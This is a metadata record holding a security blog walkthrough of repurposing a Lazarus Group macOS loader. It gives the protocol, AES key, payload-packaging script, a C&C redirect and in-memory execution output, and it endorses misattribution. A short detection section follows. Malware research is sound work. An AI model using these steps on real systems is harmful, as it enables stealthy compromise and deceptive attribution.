{
    "id": "23b1e020-b966-4bab-9599-9cc0ee9f1d77",
    "created_at": "2022-10-25T16:48:15.50413Z",
    "updated_at": "2025-03-27T02:17:23.515777Z",
    "deleted_at": null,
    "sha1_hash": "e786a69583d446ea26e7151b0a534b539b7d5fc3",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-02-27T05:58:01Z",
    "file_modification_date": "2020-02-27T05:58:01Z",
    "file_size": 4805689,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.com/blog/blog_0x54.html**\n\nWeaponizing a Lazarus Group Implant\n\nrepurposing a 1st-stage loader, to execute custom 'fileless' payloads\n\nby: Patrick Wardle / February 22, 2020\n\nüìù üëæ Want to play along?\n[I‚Äôve added the sample (‚ÄòOSX.AppleJeus.C‚Äô) to our malware collection (password: infect3d)](https://objective-see.com/downloads/malware/AppleJeus.zip)\n\n‚Ä¶please don‚Äôt infect yourself!\n\n## Background\n\nRecently a new piece of macOS malware was discovered:\n\n\n### Dinesh_Devadoss\n@dineshdina04\n\n### Another #Lazarus #macOS #trojan md5: 6588d262529dc372c400bef8478c2eec hxxps://unioncrypto.vip/\n\n Contains code: Loads Mach-O from memory and execute it /  Writes to a file and execute it@patrickwardle @thomasareed\n\n41 [8:02 PM - Dec 3, 2019](https://twitter.com/dineshdina04/status/1201834142704394242)\n\n24 people are talking about this\n\n\n[In a previous blog post I analyzed this intriguing specimen (internally named](https://objective-see.com/blog/blog_0x51.html) `macloader ),`\ncreated by the (in)famous Lazarus group.\n\n\n-----\n\nThis post highlighed its:\n\nPersistence:\n```\n   /Library/LaunchDaemons/vip.unioncrypto.plist ->\n   /Library/UnionCrypto/unioncryptoupdater\n\n```\nCommand and Control (C&C) Server:\n\n```\nhttps://unioncrypto.vip/update\n\n```\n\nCapabilities:\nThe in-memory execution of a remotely downloaded payloads.\n\n[For a full technical analysis of the sample, read my writeup: ‚ÄúLazarus Group Goes ‚ÄòFileless‚Äô‚Äù](https://objective-see.com/blog/blog_0x51.html)\n\nWhile many aspects of the malware, such as its (launch daemon) persistence mechanism are\nquite prosaic, its ability to directly execute downloaded (‚Äú2nd-stage‚Äù) payloads directly from\nmemory is rather unique. Besides increasing stealth and complicating forensics analysis of said\npayloads (as they never touch the file-system), it‚Äôs just plain sexy!\n\nIt also makes for the perfect candidate for ‚Äúrepurposing‚Äù, which is what we‚Äôll walk-thru today.\n\n## Repurposing Malware\n\n[At DefCon #27, I gave a talk titled, ‚ÄúHarnessing Weapons of Mac Destruction\", which detailed the](https://speakerdeck.com/patrickwardle/harnessing-weapons-of-mac-destruction)\nprocess of repurposing (or ‚Äúrecycling‚Äù) other peoples‚Äô Mac malware:\n\nWatch Video At: https://youtu.be/InL3YA_6P6s\n\nIn a nutshell, the idea is take existing malware and reconfigure (‚Äúrepurpose‚Äù or ‚Äúrecycle‚Äù) it for\nyour own surreptitious purposes (i.e. testing, red-teaming, offensive cyber-operations, etc):\n\n\n-----\n\nThe talk also covered the many benefits of repurposing others‚Äô malware; benefits that basically\nboil down to the fact that various well-funded groups and agencies are creating fully-featured\nmalware, so why not leverage their hard work ‚Ä¶in a way (that if discovered) will likely be\n(mis)attribute back to them?\n\n‚Ä¶IMHO, it‚Äôs a lovely idea üòá\n\n[To view the full slides from my talk, checkout: ‚ÄúHarnessing Weapons of Mac Destruction‚Äù](https://speakerdeck.com/patrickwardle/harnessing-weapons-of-mac-destruction)\n\nThe Lazarus group‚Äôs malware we‚Äôre looking at today is a perfect candidate for repurposing. Why?\nAs a 1 -stage loader, it simply beacons out to a remote server for 2st nd-stage payloads (which as\nnoted, are executed directly from memory). Thus once we understand its protocol and the\n\n\n-----\n\nexpected format of the payloads, (in theory) it should be rather trivial to repurpose the loader to\ncommunicate instead with our server, and thus stealthily execute our own 2nd-stage payloads!\n\nThis gives us ‚Äòaccess‚Äô then, to an advanced 1 -stage loader that will execute our customst\npayloads (from memory!) ‚Ä¶without us having to write a single-line of (client-side) code. üòé\n\n\nBetter yet, as the repurposing-modifications will be minimal, if this repurposed sample is ever\ndetected, it surely well be (mis)attributed back to the original authors (and as our 2nd-stage\npayloads never hit the file-system, will more than likely remain undetected) üòéüòé #winning\n\n## Repurposing Lazarus‚Äôs Loader\n\nAfter identifying a malware specimen to repurpose (‚Äúrecycle‚Äù), the next step is to comprehensively\nunderstand how it works:\n\nThe goal of this analysis phase is to:\n\nIdentify the method of persistence\nUnderstand the capabilities / payload\nIdentify the command & control server\nUnderstand the communications protocol\n\n[In a previous blog post, ‚ÄúLazarus Group Goes ‚ÄòFileless‚Äô‚Äù we thoroughly analyzed the sample and](https://objective-see.com/blog/blog_0x51.html)\nanswered the majority of these questions.\n\nHowever, I did not discuss the malware‚Äôs communications protocol, specifically the format of the\nresponse from the remote server ‚Ä¶the response that contains the 2nd-stage payload(s). As our\nultimate goal is to repurpose this malware such that it executes our own 2nd-stage payloads, this\nprotocol and payload format is essential to understand!\n\n\n-----\n\nTo facilitate dynamic analysis and to understand the malware protocol, I created a simple python\nHTTPS server that would respond to the malware‚Äôs requests.\n\nAlthough (initially) I did not know the expected format of the data, trial and error (plus a healthy\ndose of reverse-engineering) proved sufficient!\n```\n# python server.py\n [+] awaiting connections\n [+] new connection from 192.168.0.2:\n ======= POST HEADERS =======\n Host: unioncrypto.vip\n Accept: */*\n auth_signature: ca57054ea39f84a6f5ba0c65539a0762\n auth_timestamp: 1581048662\n Content-Length: 62\n Content-Type: application/x-www-form-urlencoded\n ======= POST BODY =======\n MiniFieldStorage('act', 'check')\n MiniFieldStorage('ei', 'Mac OS X 10.15 (19A603)')\n MiniFieldStorage('rlz', 'VMI5EOhq8gDz')\n MiniFieldStorage('ver', '1.0')\n [06/Feb/2020 20:11:08] \"POST /update HTTP/1.1\" 200 \n```\nArmed with a simple (initially bare-boned) custom C&C server to respond to the malware‚Äôs\nrequests, we can begin to understand the network protocol, with the ultimate goal of\nunderstanding how the 2nd-stage payloads should be remotely delivered to the malicious loader,\non infected systems.\n\nFirst, we note that on check in the malware provides some (basic) information after the infected\nsystem (e.g. the macOS version/build number: `Mac OS X 10.15 (19A603), serial number:`\n```\nVMI5EOhq8gDz, etc.), and implant version ( 'ver', '1.0' ).\n\n```\nMoving on we can hop into a disassembler to look at the malware‚Äôs code responsible for\nconnecting to the C&C server, and parsing/processing the server‚Äôs response.\n\nIn the malware‚Äôs disassembly we find a function named `onRun() that invokes a method named`\n```\nBarbeque::post . This method connects to the remote server ( https://unioncrypto.vip/ )\n\n```\nand expects the server to respond with an `HTTP 200 OK . Otherwise it takes a nap (before trying`\nagain):\n\n\n-----\n\n```\n1int onRun() {\n2  \n3  ...\n4\n5  //connect to server\n6  Barbeque::post(...);\n7  if(response != 200) goto sleep;\n8  \n9}\n\n```\nAssuming the (our) server responds with an `HTTP 200 OK, the malware checks that at least`\n```\n0x400 bytes were received, before base64-decoding said bytes:\n 1int onRun() {\n 2  \n 3  ...\n 4\n 5  //rdx: # of bytes\n 6  // make sure at least 0x400 bytes were recv'd\n 7  if ((rdx >= 0x400) && ...))) \n 8  {\n 9\n10   //rbx: recv'd bytes\n11   // base64 decond recv'd bytes\n12   rax = base64_decode(rbx, &var_80);\n13\n14   ...\n15}\n\n```\n‚Ä¶so already, we know the server‚Äôs response (which the malware expects to be a 2nd-stage\npayload) must be at least `0x400 in length ‚Ä¶and base64 encoded. As such, we update our`\ncustom C&C server to respond with at least `0x400 bytes of base64 encoded data (that for now,`\njust decodes to `ABCDEFGHIJKLMNOPQRSTUVWXYZABCD... ).`\n\nOnce we respond with the correct number ( 0x400 +) of base64 encoded bytes, the malware\nhappily continunes and invokes a function named `processUpdate (at address`\n```\n0x0000000100004be3 ). In a debugger, we can see this function takes the (base64 decoded)\n\n```\nbytes (in `RDI ) and their length (in` `RSI ):`\n\n\n-----\n\n```\n$ lldb unioncryptoupdater\n...\n(lldb) b 0x0000000100004be3\nBreakpoint 1: where = unioncryptoupdater`processUpdate(unsigned char*, unsigned long),\naddress = 0x0000000100004be3\n(lldb) r\n...\n(lldb) Process 2813 stopped\n* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1\nframe #0: 0x0000000100004be3 unioncryptoupdater`processUpdate(unsigned char*, unsigned\nlong)\n(lldb) (lldb) x/s $rdi\n0x100800600:\n\"ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ...\n(lldb) reg read $rsi\nrsi = 0x000000000000401\n\n```\nAs shown in the debugger output, so far, the malware is content with our server‚Äôs response, as\nthe response is over `0x400 bytes in length and encoded correctly. (Note our decoded bytes,`\n```\nABC... in the rdi register).\n\n```\n[In the previous blog post, we noted that the](https://objective-see.com/blog/blog_0x51.html) `processUpdate function calls into a method named`\n```\nload_from_memory to, well, load (and execute) the received bytes ‚Ä¶the 2nd-stage payload(s).\n\n```\nHowever, before it invokes this function it calls two other functions:\n```\n   md5_hash_string\n   aes_decrypt_cbc\n 1int processUpdate(int * arg0, long arg1) {\n 2  \n 3  ...\n 4\n 5  rax = md5_hash_string(&var_4D8);\n 6  r15 = rbx + 0x10;\n 7  rdx = r14 - 0x10;\n 8  if ((var_4D8 & 0x1) != 0x0) {\n 9    rcx = var_4C8;\n10  }\n11  else {\n12     rcx = &var_4D7;\n13  }\n14  _aes_decrypt_cbc(0x0, r15, rdx, rcx, &var_40);\n15}\n\n```\nLet‚Äôs step thru this in a debugger to see what it‚Äôs hashing, and what/how it‚Äôs ( AES ) decrypting.\n\nUsing our simple python HTTPS (C&C) server we‚Äôll serve up again `0x400 + bytes of`\n\n`ABCDEFGHIJKLMNOPQRSTUVWXYZABC` :\n\n\n-----\n\n```\n$ lldb unioncryptoupdater\n(lldb) x/i $pc \n0x100004c58 <+117>: callq 0x100004dab ; md5_hash_string(...);\n//print out bytes passed to md5_hash_string()\n// recall that $rsi will contain the first arg\n(lldb) x/24bx $rsi\n0x100008388: 0x18 0x56 0x4d 0x49 0x35 0x45 0x4f 0x68\n0x100008390: 0x71 0x38 0x67 0x44 0x7a 0x00 0x00 0x00\n0x100008398: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n//print out as a string\n(lldb) x/s $rsi+1\n0x100008389: \"VMI5EOhq8gDz\"\n\n```\nStopping at the call to the `md5_hash_string function, we can dump the string being passed in.`\nTurns out it‚Äôs: `VMI5EOhq8gDz (albeit prefixed with` `0x18 ).`\n\nThe calling convention utilized by macOS is the ‚ÄúSystem V‚Äù 64-bit ABI ‚Ä¶which always passes the\nfirst argument in the `rsi register.`\n\n‚ÄúSystem V operating systems [and macOS] will use RDI, RSI, RDX, RCX, R8 and R9. XMM0,\nXMM1, XMM2, XMM3, XMM4, XMM5, XMM6 and XMM7 will be used to pass floating point\nparameters. RAX will hold the syscall number. Additional arguments are passed via the stack\n(right to left).\n\nReturn values are sent back via RAX.‚Äù\n\n[-64bit ABI Cheatsheet](https://tuttlem.github.io/2013/02/14/64bit-abi-cheatsheet.html)\n\nOnce the malware has generated an `MD5 hash of this string, it invokes the` `aes_decrypt_cbc`\nfunction. What does it pass in?\n\nIn the disassembler, the `aes_decrypt_cbc function is invoked in the following manner:`\n```\n_aes_decrypt_cbc(0x0, r15, rdx, rcx, &var_40); Hopping back into the debugger we\n\n```\ncan determine what the `r15,` `rdx, and` `rcx registers hold:`\n```\n$ lldb unioncryptoupdater\n(lldb) x/i $pc \n0x100004c85 <+162>: callq 0x100004095 ; aes_decrypt_cbc\n(lldb) x/s $r15\n0x100800610: \"QRSTUVWXYZABCDEF...\n(lldb) reg read $rdx\nrdx = 0x00000000000003F1\n(lldb) x/16xb $rcx\n0x7ffeefbff279: 0x26 0x1d 0xfd 0xb9 0x70 0x43 0x84 0xf4\n0x7ffeefbff281: 0xf7 0x37 0xe0 0x1c 0x55 0x7a 0xee 0x74\n\n```\n\n-----\n\n```\nr15 : appears to be a pointer into the received (now base64 decoded) bytes. Looking back\n\n```\na few instructions in the disassembly we see: `r15 = rbx + 0x10 ( rbx is a pointer to`\nthe start of the received decoded bytes).\n\nThus, `r15 points exactly` `0x10 ( 16d ) bytes into the received, decoded bytes.`\n```\nrdx : appears to be 0x10 less than the size of the total (received) decoded bytes. Again,\n\n```\na few instructions back, we see: `rdx = r14 - 0x10 ( r14 holds the total sized of the`\nreceived decoded bytes).\n\nIn other words, `rdx is the remaining size of the (received) decoded bytes (from` `r15 to`\nthe end!).\n```\nrcx : appears initially to be a pointer some random/unknown bytes ( 0x26 0x1d 0xfd\n0xb9 ... ). However, by looking back in the disassembly, we can see it‚Äôs the result of\n\n```\nhashing the `VMI5EOhq8gDz string!`\n\nWe can also confirm this, by manually ( MD5 ) hashing `VMI5EOhq8gDz, which results in`\n```\n0x26 0x1d 0xfd 0xb9 ... (matching rcx ):\n1password = 'VMI5EOhq8gDz'\n2key = hashlib.md5(password).digest()\n3\n4print('\\nkey: '),\n5for i in range(len(key)):\n6  print('%x' % (ord(key[i]))),\n7}\n\n```\n‚Ä¶which prints out the (expected) `key: 26 1d fd b9 70 43 84 f4 f7 37 e0 1c 55 7a`\n\n```\nee 74\n\n```\n\nWe now understand the parameters passed to the `aes_decrypt_cbc function:`\n```\n   arg 0 ( 0x0 ): likely the iv ( NULL )\n   arg 1 (from $r15 ): pointer to cipher text\n   arg 2 (from $rdx ): length of cipher text\n   arg 3 (from $rcx ): key ( MD5 of the string VMI5EOhq8gDz )\n   arg 4 ( &var_40 ): aes ‚Äúcontext‚Äù\n\n```\nThus, the malware is ( AES ) decrypting the received (now base64 decoded) payload, with key =\n```\nMD5(\"VMI5EOhq8gDz\") .\n\n```\nAfter decrypting the received bytes, the malware initializes a pointer `0x90 bytes into the`\nreceived bytes, and a variable with the size of the remaining bytes, before invoking the\n```\nload_from_memory function:\n1rbx = rbx + 0x90;\n2r14 = r14 - 0x90;\n3\n4rax = load_from_memory(rbx, r14, &var_C0, rcx, &var_40, r9);\n\n```\n\n-----\n\nBefore discussing the parameters passed to this function let‚Äôs update our custom C&C server to\nserve up the same data from a file ( ABCDEF... ), but this time `AES encrypted with the hash of`\n```\n\"VMI5EOhq8gDz\" . ‚Ä¶we also make sure to skip the first 0x90 bytes (as the malware skips over\n\n```\nthese):\n```\n 1password = 'VMI5EOhq8gDz'\n 2key = hashlib.md5(password).digest()\n 3\n 4iv = 16 * '\\x00'\n 5encryptor = AES.new(key, AES.MODE_CBC, iv)\n 6\n 7with open(in_filename, 'rb') as infile:\n 8  with open(out_filename, 'wb') as outfile:\n 9    \n10    data += 0x10 * '\\x00'\n11    chunk = 0x80 * '\\x00'\n12    data += encryptor.encrypt(chunk)\n13\n14    while True:\n15      chunk = infile.read(chunksize)\n16      if len(chunk) == 0:\n17        break\n18      elif len(chunk) % 16 != 0:\n19        chunk += ' ' * (16 - len(chunk) % 16)\n20\n21      data += encryptor.encrypt(chunk)\n22    \n23    outfile.write(base64.b64encode(data))\n\n```\nSetting a breakpoint on the call to the `load_from_memory function ( 0x0000000100004cb8:`\n```\ncall load_from_memory ), we can now dump the parameters (and confirm that the encryption in\n\n```\nour custom C&C server is correct):\n```\n$ lldb unioncryptoupdater\n(lldb) x/i $pc \n0x100004cb8 <+213>: callq 0x100006dda ; load_from_memory\n//1st arg\n(lldb) x/s $rdi\n0x101002290: \"ABCDEFGHIJKLMNOPQRSTUVWXYZ...\n(lldb) reg read $rsi\nr14 = 0x0000000000000371\n\n```\nRecalling that the first and second arguments are passed in via the `rdi and` `rsi registers,`\nrespectfully, in the above debugger output we can see the malware is passing our now decoded,\ndecrypted ‚Äúpayload‚Äù ( ABC... ) and size, to the `load_from_memory function.`\n\nHooray, this confirms that our detailed analysis has correctly uncovered both the format,\nencoding, and encryption of the server‚Äôs expected response.\n\nIn summary:\n\n\n-----\n\nencoding: base64\nencryption: `AES ( CBC -mode), with a null-IV, and key of` `MD5(\"VMI5EOhq8gDz\")`\nformat: `0x400 + bytes, payload starting at offset` `0x90`\n\nAs we now fully understand the format of the malware‚Äôs protocol, in theory, we should be able\nremote transmit an encrypted & encoded binary payload and have the malware execute directly\nfrom memory!\n\n‚Ä¶but first a brief discussion of the malware‚Äôs ‚Äúload and execute from memory‚Äù code.\n\n[In my previous writeup, ‚ÄúLazarus Group Goes ‚ÄòFileless‚Äô\", I detailed exactly how the malware](https://objective-see.com/blog/blog_0x51.html)\nexecuted the 2nd-stage payload from memory. To (re)summarize:\n\nThe `load_from_memory function` `mmaps some memory (with protections:` `PROT_READ |`\n```\n   PROT_WRITE | PROT_EXEC ), then copies the decrypted payload into this memory region,\n\n```\nbefore invoking a function named `memory_exec2 .`\n\nThe `memory_exec2 function invokes the Apple API`\n```\n   NSCreateObjectFileImageFromMemory to create an ‚Äúobject file image‚Äù from a memory\n\n```\nbuffer (of a `mach-O file) then invokes the` `NSLinkModule function to link the ‚Äúobject file`\nimage‚Äù.\n\nOnce the malware has mapped and linked the downloaded payload, it invokes a function\nnamed `find_macho which appears to search the memory mapping for` `MH_MAGIC_64`\n( 0xfeedfacf ), the 64-bit ‚Äúmach magic number‚Äù in the `mach_header_64 structure.`\n\nOnce the `find_macho method returns, the malware begins parsing the mapped/linked`\n( mach-O ) payload, looking for the address of `LC_MAIN load command ( 0x80000028 ),`\nwhich contains information such as the entry point of the in-memory code.\n\nThe malware then retrieves the offset of the entry point (found at offset `0x8 within the`\n```\n   LC_MAIN load command), sets up some arguments, then jumps to this address, to kick off\n\n```\nthe execution of the payloads binary code.\n```\n1//rcx points to the `LC_MAIN` load command\n2r8 = r8 + *(rcx + 0x8);\n3...\n4\n5//invoke payload's entry point!\n6rax = (r8)(0x2, &var_40, &var_48, &var_50, r8);\n\n```\nSkimming over the disassembly of the `memory_exec2 reveals some interesting code snippets,`\nsuch as the following:\n```\n1//RDI points to the mach-O header (of the payload)\n2// offset 0xC in a mach-O header is file type (`uint32_t filetype`)\n3rbx = *(int32_t *)(rdi + 0xc);\n4if (rbx != 0x8) {\n5      *(int32_t *)(rdi + 0xc) = 0x8;\n6}\n\n```\n\n-----\n\nStepping thru this code in a debugger, reveals it is checking the type of the ( mach-O ) binary\npayload ( MH_EXECUTE, `MH_BUNDLE, etc). If the` `mach-O file type is not` `MH_BUNDLE ( 0x8 ), it`\nupdates the (in-memory) type to be this value: `*(rdi + 0xc) = 0x8 .`\n```\nProcess 2866 stopped\n* stop reason = breakpoint 1.1\nunioncryptoupdater`memory_exec2:\n-> 0x1000069c0 <+33>: cmpl  $0x8, %ebx   ;0x8: MH_BUNDLE\n  0x1000069c3 <+36>: je   0x1000069cc\n  0x1000069c5 <+38>: movl  $0x8, 0xc(%rdi)\n  0x1000069cc <+45>: leaq  -0x58(%rbp), %rdx\n(lldb) reg read $rbx\n    rbx = 0x0000000000000002 ;0x2: MH_EXECUTE\n\n```\n[This is done, (as online research notes) as the](https://threatvector.cylance.com/en_us/home/running-executables-on-macos-from-memory.html) `man page for` `NSModule state: ‚ÄúCurrently the`\n_implementation is limited to only Mach-O MH_BUNDLE types which are used for plugins.\" Thus in_\norder to play nicely with the Apple APIs and thus support the in-memory execution of ‚Äòstandard‚Äô\n```\nmach-O executables (type: MH_EXECUTE ), this ‚Äòpatch‚Äô must be applied.\n\n```\nHowever, the most interesting thing about this snippet of code found within the malware, is that\nit‚Äôs not original‚Ä¶\n\n[In 2017, Cylance published a blog post titled: ‚ÄúRunning Executables on macOS From Memory\".](https://threatvector.cylance.com/en_us/home/running-executables-on-macos-from-memory.html)\nThough the topic of in-memory code execution on macOS had been covered before (as was\nnoted in the blog post), the post provided a comprehensive technical deep-dive into the topic, and\nmore importantly provided an open-source project which included code to perform in-memory\n[loading: ‚Äúosx_runbin\".](https://github.com/CylanceVulnResearch/osx_runbin)\n\nThe researcher (Stephanie Archibald), also presented this research (and more!) at an Infiltrate\ntalk:\n\n\n### daveaitel\n@daveaitel\n\n### Here we are learning modernized osx rootkits (userland) from Stephanie Archibald !\n\n\n-----\n\n‚Ä¶in other words, the Lazarus group coders simply leveraged (copied/stole) the existing opensource `osx_runbin code in order to give their loader, advanced stealth and anti-forensics`\ncapabilities. And who can blame them? Work smart, not hard, right!? üòÖ\n\nThis is not the first time, I‚Äôve stumbled across ‚Äúshared‚Äù code in macOS APT group malware\nspecimens.\n\n[See: ‚ÄúFrom Italy With Love? Finding HackingTeam code in Russian Malware‚Äù](https://objective-see.com/blog/blog_0x18.html)\n\nOk, so let‚Äôs start to wrap this all up, and (finally!) illustrate the full repurposing of the Lazarus\ngroup‚Äôs loader, so that it beacons to our C&C server to download and execute (from memory),\n**our 2nd-stage payloads!**\n\n\n13 [1:36 AM - Apr 7, 2017](https://twitter.com/daveaitel/status/850039542698708992)\n\nSee daveaitel's other Tweets\n\n[If we compare Cylance‚Äôs osx_runbin code, it is trivial to see the in-memory loader code found](https://github.com/CylanceVulnResearch/osx_runbin)\nwithin the Lazarus‚Äôs group‚Äôs malware is nearly 100% the same:\n\n\n-----\n\nStep one is to modify the loader so that it beacons to our C&C server for tasking.\n\nLooking in the disassembler, we find the hardcoded address of the malware C&C server:\n```\nhttps://unioncrypto.vip/update :\n\n```\nPopping into a hexeditor, we can modify this to whatever URL or IP address we‚Äôd like the\nmalware to now connect to (i.e. to from `https://unioncrypto.vip/update to`\n```\nhttps://allyourbase.belong/ ):\n\n```\nOne the malware checks in:\n\n\n-----\n\n```\n# python server.py\n [+] awaiting connections\n [+] new connection from 192.168.0.2\n ======= POST HEADERS =======\n Host: allyourbase.belong\n Accept: */*\n auth_signature: ca57054ea39f84a6f5ba0c65539a0762\n auth_timestamp: 1581048662\n Content-Length: 62\n Content-Type: application/x-www-form-urlencoded\n ======= POST BODY =======\n MiniFieldStorage('act', 'check')\n MiniFieldStorage('ei', 'Mac OS X 10.15 (19A603)')\n MiniFieldStorage('rlz', 'VMI5EOhq8gDz')\n MiniFieldStorage('ver', '1.0')\n [06/Feb/2020 20:11:08] \"POST /update HTTP/1.1\" 200 \n```\n‚Ä¶we should be able to serve up our 2nd-stage payloads!\n\nStep two is to prepare and package up these payloads. This involves encrypting ( AES, key:\n```\nMD5(\"VMI5EOhq8gDz\") ) any mach-O binary and placing that at offset 0x90 within the\n\n```\nserver‚Äôs base64-encoded response.\n\nDuring our analysis phase, we had (already) put together some basic python code, to implement\nthis logic:\n\n\n-----\n\n```\n 1import os, random, struct, hashlib, base64\n 2from Crypto.Cipher import AES\n 3\n 4password = 'VMI5EOhq8gDz'\n 5key = hashlib.md5(password).digest()\n 6\n 7def encryptFile(key, in_filename, out_filename=None, chunksize=64*1024):\n 8  \n 9  iv = 16 * '\\x00'\n10  encryptor = AES.new(key, AES.MODE_CBC, iv)\n11 \n12  data = \"\"   \n13\n14  with open(in_filename, 'rb') as infile:\n15    with open(out_filename, 'wb') as outfile:\n16      \n17      data += 0x10 * '\\x00'\n18      chunk = 0x80 * '\\x00'\n19      data += encryptor.encrypt(chunk)\n20\n21      while True:\n22        chunk = infile.read(chunksize)\n23        if len(chunk) == 0:\n24          break\n25        elif len(chunk) % 16 != 0:\n26          chunk += ' ' * (16 - len(chunk) % 16)\n27\n28        data += encryptor.encrypt(chunk)\n29      \n30      outfile.write(base64.b64encode(data))\n31\n32encryptFile(key, 'payloadBEFORE', 'payloadAFTER')\n\n```\nNow we just need a test payload ‚Ä¶a standard `\"Hello World\" binary should suffice:`\n```\n1#import <Foundation/Foundation.h>\n2\n3int main(int argc, const char * argv[]) {\n4  @autoreleasepool {\n5    // insert code here...\n6    NSLog(@\"Hello, World!\");\n7  }\n8  return 0;\n9}\n\n```\nAfter compiling this `\"Hello World\" code into a` `mach-O binary, we run it thru our python`\n‚Äúdeployment‚Äù script which encrypts, encodes, and packages it all up:\n\n\n-----\n\n```\n$ python deploy.py \n[+] AES encrypting payload...\n[+] Base64 encoding payload...\n[+] payload ready for deployment!\n$ hexdump -C payload\n00000000 45 52 45 52 45 52 45 52 45 52 45 52 45 52 45 52 |ERERERERERERERER|\n00000010 45 52 45 52 45 58 73 7a 75 42 33 44 7a 4a 52 6e |EREREXszuB3DzJRn|\n00000020 7a 45 48 66 30 4c 42 4f 4d 66 50 41 37 5a 31 73 |zEHf0LBOMfPA7Z1s|\n00000030 4a 7a 50 39 58 78 7a 64 2b 37 4a 34 47 47 50 43 |JzP9Xxzd+7J4GGPC|\n00000040 47 52 44 73 68 46 52 2b 4e 32 75 66 61 47 45 42 |GRDshFR+N2ufaGEB|\n00000050 6e 46 6e 33 7a 45 43 45 50 52 6f 4e 57 32 63 67 |nFn3zECEPRoNW2cg|\n00000060 6f 52 7a 68 42 34 48 57 31 38 4c 42 35 48 48 4d |oRzhB4HW18LB5HHM|\n00000070 53 71 6f 4a 35 74 74 63 77 38 66 63 36 74 75 6d |SqoJ5ttcw8fc6tum|\n\n```\nNow, we simply modify our custom C&C server to serve up this processed payload when the\nrepurposed malware checks in with our server:\n```\n# python server.py\n [+] awaiting connections\n [+] new connection from 192.168.0.2\n ======= POST HEADERS =======\n Host: allyourbase.belong\n ...\n [+] responding with 2nd-stage payload (42264 bytes)\n\n```\nSetting a breakpoint within the `memory_exec2 function (specifically at` `0x0000000100006af6,`\nthe call into the payload‚Äôs `main /entrypoint), allows us to confirm that our payload has been`\nsuccessfully transmitted to the remote (now repurposed) loader, unpackaged, decoded, and\ndecrypted successfully:\n\n\n-----\n\n```\n(lldb) b 0x0000000100006af6\nBreakpoint 2: where = unioncryptoupdater`memory_exec2 + 343\n...\nProcess 2866 stopped\n* thread #1, stop reason = breakpoint 2.1\nunioncryptoupdater`memory_exec2 + 343:\n-> 0x100006af6 <+343>: callq *%r8\n(lldb) x/10i $r8\n  0x201800f20: 55          pushq %rbp\n  0x201800f21: 48 89 e5       movq  %rsp, %rbp\n  0x201800f24: 48 83 ec 20      subq  $0x20, %rsp\n  0x201800f28: c7 45 fc 00 00 00 00 movl  $0x0, -0x4(%rbp)\n  0x201800f2f: 89 7d f8       movl  %edi, -0x8(%rbp)\n  0x201800f32: 48 89 75 f0      movq  %rsi, -0x10(%rbp)\n  0x201800f36: e8 33 00 00 00    callq 0x201800f6e      \n  0x201800f3b: 48 8d 35 c6 00 00 00 leaq  0xc6(%rip), %rsi   ; @\"Hello, World!\"\n  0x201800f42: 48 89 f7       movq  %rsi, %rdi\n  0x201800f45: 48 89 45 e8      movq  %rax, -0x18(%rbp)\n  0x201800f49: b0 00         movb  $0x0, %al\n  0x201800f4b: e8 12 00 00 00    callq 0x201800f62      ; NSLog\n\n```\n‚Ä¶and if we continue ( c ), our 2nd-stage payload is successfully executed on the infected system,\ndirectly from memory!\n```\n(lldb) c\nProcess 2866 resuming\n2020-02-17 23:34:30.606876-0800 unioncryptoupdater[2866:213719] Hello, World!\n...\n$ log show | grep \"Hello, World\"\n2020-02-17 23:34:30.606982-0800 unioncryptoupdater: (core) Hello, World!\n\n```\nHooray, we‚Äôre stoked! ü•≥\n\n## Detection\n\nBefore ending, I want to briefly discuss detection of this threat (either in it‚Äôs pristine or repurposed\nstate).\n\n[First, it‚Äôs rather trivial to detect the malware‚Äôs (launch daemon) persistence (e.g. via BlockBlock):](https://objective-see.com/products/blockblock.html)\n\n\n-----\n\n[Our firewall LuLu will also detects the unauthorized network traffic to the attacker (or our!) C&C](https://objective-see.com/products/lulu.html)\nserver:\n\nAnd what about detecting the in-memory execution of 2nd-stage payloads? Turns out that‚Äôs a bit\ntricker (which is one of the reasons why attacker have begun to utilize this technique!).\n\nGood news though (from the detection point of view), the well-known macOS security researcher\n[(and former #OBTS speaker!) Richie Cyrus recently published a blog post that included a section](https://twitter.com/rrcyrus)\ntitled: ‚ÄúUsing ESF to Detect In-Memory Execution‚Äù\n\n\n### Richie Cyrus\n@rrcyrus\n\n### For the past few months, I've been diving into Apple's Endpoint Security Framework. This post shares how I use the framework\n\n\n-----\n\n### for detection engineering purposes. posts.specterops.io/detection-engi‚Ä¶\n\n[357](https://twitter.com/intent/like?tweet_id=1222906150125035520) [11:35 PM - Jan 30, 2020](https://twitter.com/rrcyrus/status/1222906150125035520)\n\n140 people are talking about this\n\n\nIn his, post he notes that via Apple‚Äôs new Endpoint Security Framework (ESF), we can track\nvarious events, such as memory mappings ( ES_EVENT_TYPE_NOTIFY_MMAP ) which (when\ncombined with other observable events delivered by the ESF) may be used to detect the\nexecution of an in-memory payload:\n\n### \"Of the event types, ES_EVENT_TYPE_NOTIFY_MMAP stands out as there was a call to mmap in the PoC code which generated the Calculator execution...\"\n\nUnfortunately, without a kernel extension (which Apple is rapidly deprecating), as far as I know,\nthere is no way to dump a process‚Äôs memory contents. Thus even if we are to detect that a 2ndstage payload is executing from memory, we won‚Äôt be to capture the payload (i.e. dump it from\nmemory). Apple, a little help here!?\n\nFor more on the topic of memory forensics on macOS, check out the following (insightful!) thread:\n\n\n### Matt Suiche\n@msuiche\n\n### Memory scanning capabilities on macOS are pretty bad in general. But this abolition of kexts for macOS will definitely make it impossible to access the memory if no access to kernel mode will be possible. twitter.com/patrickwardle/‚Ä¶\n\n\n-----\n\n**patrick wardle** @patrickwardle\n\nMatt raises an excellent point - we need memory scanning/ forensics\ncapabilities for macOS.\n\n[Ex: Lazarus group recently deployed a 1st-stage implant able to](https://twitter.com/patrickwardle/status/1226280388315627520)\nexecute 2nd-stage payloads directly from memory (objectivesee.com/blog/blog_0x51‚Ä¶)\n\nSo, what are options now? twitter.com/msuiche/status‚Ä¶\n\n21 [2:22 PM - Feb 9, 2020](https://twitter.com/msuiche/status/1226390783768637440)\n\nSee Matt Suiche's other Tweets\n\n\n## Conclusion\n\nLazarus group proves yet again to be a well-resourced, persistent threat, that continues to target\nmacOS users with ever evolving capabilities. ‚Ä¶so why not repurpose their malware for our own\nsurreptitious 